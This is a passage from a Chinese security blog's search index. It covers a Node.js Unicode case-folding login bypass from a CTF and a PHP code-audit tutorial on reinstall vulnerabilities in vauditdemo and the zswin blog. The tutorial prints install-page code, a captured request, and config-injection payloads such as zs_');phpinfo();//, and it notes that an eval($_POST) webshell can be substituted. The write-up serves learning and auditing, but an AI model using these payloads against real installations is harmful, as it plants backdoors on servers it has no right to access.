&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5728;&#x4E4B;&#x540E;&#x7684;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x7684;&#x662F;toLowerCase&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x4E24;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002; &#x9898;&#x76EE;&#x4E2D;&#x9ED8;&#x8BA4;&#x7684;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hacktm &#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x767B;&#x5F55;&#x65F6;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hac&#x212A;tm &#x5373;&#x53EF;&#x7ED5;&#x8FC7;isValidUser&#x548C;isAdmin&#x7684;&#x9A8C;&#x8BC1;&#x3002; &#x9898;&#x76EE;&#x5B8C;&#x6574;Writeup&#xFF1A; &#x8BF4;&#x5728;&#x6700;&#x540E;&#x6700;&#x8FD1;&#x624D;&#x521A;&#x5F00;&#x59CB;&#x5B66;&#x4E60;Node.js&#xFF0C;&#x6253;&#x7B97;&#x8D81;&#x5BD2;&#x5047;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x628A;&#x5E38;&#x89C1;&#x7684;&#x51E0;&#x4E2A;&#x6F0F;&#x6D1E;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x4E2D;&#x51FA;&#x73B0;&#x4E86;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x5E0C;&#x671B;&#x5E08;&#x5085;&#x4EEC;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x6765;&#xFF0C;&#x5341;&#x5206;&#x611F;&#x8C22;&#xFF01; &#x53C2;&#x8003; &#x6D45;&#x8C08;Node.js Web&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898; &#x6DF1;&#x5165;&#x7406;&#x89E3;JavaScript Prototype&#x6C61;&#x67D3;&#x653B;&#x51FB; &#x5229;&#x7528; Node.js &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x4EE3;&#x7801; Sandboxing NodeJS is hard, here is why https://segmentfault.com/a/1190000012672620 Fuzz&#x4E2D;&#x7684;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;","link":"/2020/01/30/NodeJsVulns/"},{"title":"PHP代码审计之重装漏洞","text":"&#x91CD;&#x88C5;&#x6F0F;&#x6D1E;&#x6839;&#x636E;&#x5927;&#x4F6C;&#x4EEC;&#x7684;&#x603B;&#x7ED3;&#xFF0C;&#x91CD;&#x88C5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x7C7B;&#x578B;&#xFF1A; &#x81EA;&#x52A8;&#x5220;&#x9664;&#x8FD9;&#x4E2A;&#x5B89;&#x88C5;&#x6587;&#x4EF6; &#x901A;&#x8FC7;&#x751F;&#x6210;&#x4E00;&#x4E2A;lock&#x6587;&#x4EF6;&#x6765;&#x5224;&#x65AD;&#x7A0B;&#x5E8F;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x8FC7; &#x6839;&#x672C;&#x65E0;&#x9A8C;&#x8BC1; &#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x6587;&#x4EF6;&#xFF0C;&#x53C8;&#x4E0D;&#x4F1A;&#x751F;&#x6210;lock&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x8FC7; &#x5B89;&#x88C5;file &#x76F4;&#x63A5;&#x7528;GET&#x63D0;&#x4EA4;step&#x7ED5;&#x8FC7;&#xFF0C;&#x76F4;&#x63A5;&#x8FDB;&#x5165;&#x4E0B;&#x4E00;&#x6B65; &#x53D8;&#x91CF;&#x8986;&#x76D6;&#x5BFC;&#x81F4;&#x91CD;&#x88C5; &#x53EF;&#x4EE5;GET,POST,COOKIE &#x4EFB;&#x610F;&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x540D;$insLockfile,&#x7ED9;&#x5176;&#x8D4B;&#x7A7A;&#x503C;&#xFF0C;&#x8986;&#x76D6;&#x6389;$insLockfile,&#x4ECE;&#x800C;&#x8BA9;file_exists&#x4E3A;false&#x5C31;&#x4E0D;&#x4F1A;&#x9000;&#x51FA; &#x5224;&#x65AD;lock&#x540E;&#xFF0C;&#x65E0;exit &#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;lock&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;lock&#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x4F1A;header&#x5230;index.php,&#x4F46;&#x662F;header&#x540E;&#x5E76;&#x6CA1;&#x6709;exit&#xFF0C;&#x6240;&#x4EE5; &#x5E76;&#x4E0D;&#x4F1A;&#x9000;&#x51FA;&#xFF0C;&#x7C7B;&#x4F3C;&#x7684;&#x8FD8;&#x6709;javascript&#x5F39;&#x4E2A;&#x6846; &#x89E3;&#x6790;&#x6F0F;&#x6D1E; &#x5728;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5C06;install.php &#x91CD;&#x547D;&#x540D;&#x4E3A;index.php.bak,&#x4F46;&#x662F;&#x7531;&#x4E8E;Apache&#x7684;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#xFF1A;&#x5982;&#x679C;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x540E;&#x7F00;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x5411;&#x4E0A;&#x89E3;&#x6790;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53C8;&#x53D8;&#x6210;&#x4E86;php&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x7ED3;&#x5408;&#x5B89;&#x88C5;&#x65F6;&#x7684;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x53C8;&#x6210;&#x91CD;&#x88C5;&#x4E86;&#x3002; &#x6EE1;&#x8DB3;&#x4E00;&#x4E9B;&#x6761;&#x4EF6;&#x4E0D;&#x4F1A;&#x9000;&#x51FA;&#x7684; &#x8FD9;&#x6B21;&#x590D;&#x73B0;&#x7684;&#x4E24;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x90FD;&#x5C5E;&#x4E8E;&#x7B2C;&#x4E94;&#x7C7B;&#x3002;&#x5F53;&#x9875;&#x9762;&#x8DF3;&#x8F6C;&#x5230;&#x4E3B;&#x9875;&#x4E4B;&#x540E;&#xFF0C;&#x539F;&#x6765;&#x7684;php&#x8FDB;&#x7A0B;&#x4F9D;&#x7136;&#x5B58;&#x5728;&#xFF0C;&#x5BFC;&#x81F4;&#x53EF;&#x4EE5;&#x91CD;&#x88C5;&#xFF0C;&#x800C;&#x5F53;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#x800C;&#x88AB;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x4E86;&#x6587;&#x4EF6;&#x5F53;&#x4E2D;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;getshell&#x3002;&#x5BFB;&#x627E;&#x6B64;&#x7C7B;&#x6F0F;&#x6D1E;&#x5E94;&#x8BE5;&#x5C1D;&#x8BD5;&#x53BB;&#x8DDF;&#x8E2A;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x7684;&#x6700;&#x7EC8;&#x53BB;&#x5904;&#xFF0C;&#x5E76;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x6709;&#x8FC7;&#x6EE4;&#x3002;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x95ED;&#x5408;&#x8BED;&#x53E5;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x3002; &#x590D;&#x73B0; vauditdemo&#x91CD;&#x88C5;&#x6F0F;&#x6D1E;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x8BBF;&#x95EE; http://127.0.0.1/install/install.php &#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;&#xFF0C;&#x7528;brupsuite&#x6293;&#x5305;&#x3002;(&#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x6F14;&#x793A;&#xFF0C;&#x6211;&#x5C06;header()&#x8BED;&#x53E5;&#x6CE8;&#x91CA;&#x4E86;) 1234567891011121314POST /install/install.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/install/install.phpContent-Type: application/x-www-form-urlencodedContent-Length: 84Connection: closeCookie: PHPSESSID=jfjge50g22ieqm7ib5ia1quf73Upgrade-Insecure-Requests: 1dbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=vauditdemo&amp;Submit=%E5%AE%89%E8%A3%9D &#x5C06;dbname&#x4FEE;&#x6539;&#x4E3A;&#xFF1A; testdb;-- -&quot;;phpinfo();// &#x63D0;&#x4EA4;&#x3002; &#x8DF3;&#x8F6C;&#x5230;index&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x770B;&#x5230;phpinfo()&#x4FE1;&#x606F; &#x590D;&#x73B0;&#x6210;&#x529F; &#x4EE3;&#x7801;&#x5206;&#x6790;&#x5E73;&#x53F0;&#x7684;install.php&#x5B89;&#x88C5;&#x9875;&#x9762;, &#x5B89;&#x88C5;&#x4E4B;&#x524D;&#x4F1A;&#x6709;&#x4E00;&#x6BB5;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x7684;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#xFF1A; 123if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/sys/install.lock&apos;) ) { header( &quot;Location: ../index.php&quot; );} &#x5224;&#x65AD;&#x5B89;&#x88C5;&#x751F;&#x6210;&#x7684;lock&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x91CD;&#x5B9A;&#x5411;&#x5230;index.php &#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#xFF0C;&#x5F53;&#x9875;&#x9762;&#x91CD;&#x5B9A;&#x5411;&#x5230;index&#x4E4B;&#x540E;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x6267;&#x884C;exit&#x8BED;&#x53E5;&#x6765;&#x7ED3;&#x675F;&#x8FDB;&#x7A0B;&#xFF0C;&#x6240;&#x4EE5;install.php&#x7684;&#x8FDB;&#x7A0B;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#x3002;&#x8FD9;&#x65F6;&#x5982;&#x679C;&#x7528;brupsuite&#x6293;&#x5305;&#xFF0C;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x4E4B;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x6240;&#x6267;&#x884C;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x91CD;&#x88C5;&#x6F0F;&#x6D1E;&#x3002; &#x5224;&#x65AD;&#x8BED;&#x53E5;&#x540E;&#xFF0C;&#x83B7;&#x53D6;&#x4E86;&#x4E00;&#x4E9B;&#x73AF;&#x5883;&#x4FE1;&#x606F;&#x4E4B;&#x540E;&#x5C31;&#x901A;&#x8FC7;POST&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#x3002; (&#x4EE3;&#x7801;&#x7ECF;&#x8FC7;&#x7701;&#x7565;) 12345678910111213141516171819202122232425262728293031323334353637383940414243if ( $_POST ) { ... $dbhost = $_POST[&quot;dbhost&quot;]; $dbuser = $_POST[&quot;dbuser&quot;]; $dbpass = $_POST[&quot;dbpass&quot;]; $dbname = $_POST[&quot;dbname&quot;]; ... mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() ); $str_tmp=&quot;&lt;?php\\r\\n&quot;; $str_end=&quot;?&gt;&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;error_reporting(0);\\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;if (!file_exists(\\$_SERVER[\\&quot;DOCUMENT_ROOT\\&quot;].&apos;/sys/install.lock&apos;)){\\r\\n\\theader(\\&quot;Location: /install/install.php\\&quot;);\\r\\nexit;\\r\\n}\\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;include_once(&apos;../sys/lib.php&apos;);\\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;\\$host=\\&quot;$dbhost\\&quot;; \\r\\n&quot;; $str_tmp.=&quot;\\$username=\\&quot;$dbuser\\&quot;; \\r\\n&quot;; $str_tmp.=&quot;\\$password=\\&quot;$dbpass\\&quot;; \\r\\n&quot;; $str_tmp.=&quot;\\$database=\\&quot;$dbname\\&quot;; \\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;\\$conn = mysql_connect(\\$host,\\$username,\\$password);\\r\\n&quot;; $str_tmp.=&quot;mysql_query(&apos;set names utf8&apos;,\\$conn);\\r\\n&quot;; $str_tmp.=&quot;mysql_select_db(\\$database, \\$conn) or die(mysql_error());\\r\\n&quot;; $str_tmp.=&quot;if (!\\$conn)\\r\\n&quot;; $str_tmp.=&quot;{\\r\\n&quot;; $str_tmp.=&quot;\\tdie(&apos;Could not connect: &apos; . mysql_error());\\r\\n&quot;; $str_tmp.=&quot;\\texit;\\r\\n&quot;; $str_tmp.=&quot;}\\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=&quot;session_start();\\r\\n&quot;; $str_tmp.=&quot;\\r\\n&quot;; $str_tmp.=$str_end; $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; ); fwrite( $fp, $str_tmp ); fclose( $fp ); &#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x9875;&#x9762;&#x901A;&#x8FC7;&#x6240;&#x63D0;&#x4EA4;&#x7684;dbhost, dbuser, dbpass, dbname&#x6765;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x57FA;&#x672C;&#x4FE1;&#x606F;&#x3002; &#x5728;&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;&#x662F;&#x5426;&#x7B26;&#x5408;&#x5B89;&#x88C5;&#x6761;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x9875;&#x9762;&#x5C06;&#x4E00;&#x6BB5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x7684;php&#x811A;&#x672C;&#x5199;&#x5165;&#x5230;config.php&#x91CC;&#x3002; &#x95EE;&#x9898;&#x51FA;&#x5728;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x6761;&#x8BED;&#x53E5;&#xFF1A; 1$str_tmp.=&quot;\\$database=\\&quot;$dbname\\&quot;; \\r\\n&quot;; &#x53EF;&#x77E5;&#xFF0C;dbname&#x662F;&#x53EF;&#x63A7;&#x7684;&#x3002; &#x5F53;&#x6211;&#x4EEC;&#x5C06;dbname&#x8BBE;&#x7F6E;&#x4E3A;&#xFF1A; testdb;-- -&quot;;phpinfo();// -- - &#x662F;&#x4E3A;&#x4E86;&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;sql&#x8BED;&#x53E5; &quot;; &#x95ED;&#x5408;php&#x8BED;&#x53E5; // &#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;php&#x8BED;&#x53E5; config.php&#x91CC;&#x7684;&#x8BED;&#x53E5;&#x5C31;&#x4F1A;&#x53D8;&#x6210;&#xFF1A; 1$database=&quot;testdb; -- -&quot;; phpinfo();//&quot;; &#x4E5F;&#x5C31;&#x4F1A;&#x6267;&#x884C;phpinfo(), &#x5F53;&#x6211;&#x4EEC;&#x628A;phpinfo()&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;eval($_POST[&apos;abc&apos;])&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;getshell&#xFF1B; zswin&#x535A;&#x5BA2;&#x91CD;&#x88C5;&#x6F0F;&#x6D1E; getshell &#x590D;&#x73B0;&#x5728;&#x767E;&#x5EA6;&#x4E0A;&#x76F4;&#x63A5;&#x641C;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x88C5;&#x6F0F;&#x6D1E;&#xFF0C;&#x535A;&#x5BA2;&#x7CFB;&#x7EDF;&#x6709;&#x70B9;&#x8001;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x62FF;&#x6765;&#x5B66;&#x4E60;&#x8FD8;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x3002; &#x53C2;&#x8003;&#xFF1A;https://shuimugan.com/bug/view?bug_no=119025 &#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x597D;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#xFF1A; http://127.0.0.1/zwin/install.php?m=install&amp;c=index&amp;a=setconf &#x4E0D;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x4E3B;&#x9875;&#xFF0C;&#x76F4;&#x63A5;&#x8FDB;&#x5165;&#x5B89;&#x88C5;&#x5411;&#x5BFC;&#x9875;&#x9762;&#x3002; &#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6B63;&#x5E38;&#x586B;&#x5199;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x8868;&#x524D;&#x7F00;&#x6539;&#x4E3A;&#xFF1A; zs_&apos;);phpinfo();// &#x70B9;&#x51FB;&#x4E0B;&#x4E00;&#x6B65;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5C31;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x6210;&#x529F; &#x4E4B;&#x540E;&#x518D;&#x8BBF;&#x95EE;&#xFF1A; http://127.0.0.1/zwin/app/user/conf/config.php &#x53EF;&#x4EE5;&#x770B;&#x5230;phpinfo()&#xFF0C;&#x628A;phpinfo()&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;eval($_POST[&apos;abc&apos;])&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;getshell&#xFF1B; &#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x6210;&#x529F; &#x4EE3;&#x7801;&#x5206;&#x6790;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x9875;&#x9762;&#xFF1A; install/install/controller/indexcontroller.class.php &#x9875;&#x9762;&#x5F00;&#x5934;&#x5B58;&#x5728;&#x4E00;&#x4E2A;index()&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF1A; 12345 public function index(){ if (is_file(&apos;./Data/install.lock&apos;)) { header(&apos;Location: ./index.php&apos;); exit;} &#x6839;&#x636E;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#x7684;&#x8BF4;&#x6CD5;&#xFF1A; &#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x4E0D;&#x662F;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#x6240;&#x4EE5;&#x4E0D;&#x5F71;&#x54CD;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x7684;&#x4F7F;&#x7528;&#x3002; &#x6211;&#x5728;&#x9875;&#x9762;&#x5F53;&#x4E2D;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5F15;&#x7528;index()&#x65B9;&#x6CD5;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;ThinkPHP&#x6846;&#x67B6;&#x7684;&#x4E00;&#x4E9B;&#x56FA;&#x5B9A;&#x7528;&#x6CD5;&#x5427;&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7B49;&#x540E;&#x9762;&#x5B66;&#x4E60;&#x4E86;ThinkPHP&#x6846;&#x67B6;&#x540E;&#x518D;&#x8BF4;&#x3002; &#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x770B;&#x3002; 123456789101112131415161718public function finish_done() { ... $auth = build_auth_key(); $config_data[&apos;DB_TYPE&apos;] = $temp_info[&apos;db_type&apos;]; $config_data[&apos;DB_HOST&apos;] = $temp_info[&apos;db_host&apos;]; $config_data[&apos;DB_NAME&apos;] = $temp_info[&apos;db_name&apos;]; $config_data[&apos;DB_USER&apos;] = $temp_info[&apos;db_user&apos;]; $config_data[&apos;DB_PWD&apos;] = $temp_info[&apos;db_pass&apos;]; $config_data[&apos;DB_PORT&apos;] = $temp_info[&apos;db_port&apos;]; $config_data[&apos;DB_PREFIX&apos;] = $&lt;strong&gt;temp_info&lt;/strong&gt;[&apos;db_prefix&apos;]; $db = Db::getInstance($config_data); $config_data[&apos;WEB_MD5&apos;] = $auth; $conf = write_config($config_data); ... } &#x53EF;&#x77E5;&#xFF0C;&#x5728;finish_done()&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4E3A;write_config(),&#x6240;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x3002; &#x800C;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#xFF0C;&#x90FD;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#x6216;&#x68C0;&#x67E5;&#x3002;&#x90FD;&#x662F;&#x76F4;&#x63A5;&#x63A5;&#x6536;POST&#x6570;&#x636E;&#x6765;&#x8FDB;&#x884C;&#x4F20;&#x9012;&#x7684;&#x3002; &#x8DDF;&#x8E2A;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x81F3;&#xFF1A;install/install/common/function.php 1234567891011121314151617function write_config($config, $auth){ if(is_array($config)){ //&#x8BFB;&#x53D6;&#x914D;&#x7F6E;&#x5185;&#x5BB9; $conf = file_get_contents(MODULE_PATH . &apos;sqldata/conf.tpl&apos;); $user = file_get_contents(MODULE_PATH . &apos;sqldata/user.tpl&apos;); //&#x66FF;&#x6362;&#x914D;&#x7F6E;&#x9879; foreach ($config as $name =&gt; $value) { $conf = str_replace(&quot;[{$name}]&quot;, $value, $conf); $user = str_replace(&quot;[{$name}]&quot;, $value, $user); } //&#x5199;&#x5165;&#x5E94;&#x7528;&#x914D;&#x7F6E;&#x6587;&#x4EF6; file_put_contents(&apos;./App/Common/Conf/config.php&apos;, $conf); file_put_contents(&apos;./App/User/Conf/config.php&apos;, $user); return &apos;&apos;; }} &#x53EF;&#x77E5;&#xFF0C;&#x51FD;&#x6570;&#x7684;&#x529F;&#x80FD;&#x662F;&#x8BFB;&#x53D6;sqldata&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x4F20;&#x9012;&#x8FDB;&#x6765;&#x7684;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x5206;&#x522B;&#x5199;&#x5165;&#x5230;&#x4E24;&#x4E2A;config.php&#x91CC;&#x53BB;&#x3002; &#x5148;&#x770B;&#x4E00;&#x4E0B;user.sql: 12345678910111213&lt;?php/** * UCenter&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;&#x6587;&#x4EF6; * &#x6CE8;&#x610F;&#xFF1A;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BF7;&#x4F7F;&#x7528;&#x5E38;&#x91CF;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49; */define(&apos;UC_APP_ID&apos;, 1); //&#x5E94;&#x7528;IDdefine(&apos;UC_API_TYPE&apos;, &apos;Model&apos;); //&#x53EF;&#x9009;&#x503C; Model / Servicedefine(&apos;UC_AUTH_KEY&apos;, &apos;[WEB_MD5]&apos;); //&#x52A0;&#x5BC6;KEYdefine(&apos;UC_DB_DSN&apos;, &apos;[DB_TYPE]://[DB_USER]:[DB_PWD]@[DB_HOST]:[DB_PORT]/[DB_NAME]&apos;); // &#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF0C;&#x4F7F;&#x7528;Model&#x65B9;&#x5F0F;&#x8C03;&#x7528;API&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x6B64;&#x9879;define(&apos;UC_TABLE_PREFIX&apos;, &apos;[DB_PREFIX]&apos;); // &#x6570;&#x636E;&#x8868;&#x524D;&#x7F00;&#xFF0C;&#x4F7F;&#x7528;Model&#x65B9;&#x5F0F;&#x8C03;&#x7528;API&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x6B64;&#x9879;?&gt; &#x9664;&#x4E86;DB_NAME, DB_PREFIX&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4EE5;&#x5916;&#xFF0C;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x7684;&#x6570;&#x636E;&#x914D;&#x7F6E;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x5E93;&#x521B;&#x5EFA;&#x5931;&#x8D25;&#x3002; &#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x5C31;&#x5B58;&#x5728;&#x4E24;&#x5904; &#x5C06;DB_NAME&#x8D4B;&#x503C;&#x4E3A;&#xFF1A; zswin1]&apos;);phpinfo();// &#x6216;&#x8005;&#x5C06;DB_PREFIX&#x8D4B;&#x503C;&#x4E3A;&#xFF1A; zs_&apos;);phpinfo();// &#x90FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6210;&#x529F;&#x3002; /App/User/Conf/config.php&#x5C31;&#x4F1A;&#x53D8;&#x6210;&#xFF1A; 12345define(&apos;UC_DB_DSN&apos;, &apos;mysql://root:root@127.0.0.1:3306/zswin1]&apos;);phpinfo();//&apos;); // &#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF0C;&#x4F7F;&#x7528;Model&#x65B9;&#x5F0F;&#x8C03;&#x7528;API&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x6B64;&#x9879;//&#x6216;&#x8005;define(&apos;UC_TABLE_PREFIX&apos;, &apos;zs_&apos;);phpinfo();//&apos;); // &#x6570;&#x636E;&#x8868;&#x524D;&#x7F00;&#xFF0C;&#x4F7F;&#x7528;Model&#x65B9;&#x5F0F;&#x8C03;&#x7528;API&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x6B64;&#x9879; sqldata/conf.tpl&#x4E5F;&#x662F;&#x4E00;&#x6837;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;user.tql&#x53EF;&#x4EE5;&#x66F4;&#x5BB9;&#x6613;&#x95ED;&#x5408;&#x8BED;&#x53E5;&#x3002; &#x9047;&#x5230;&#x7684;&#x95EE;&#x9898; 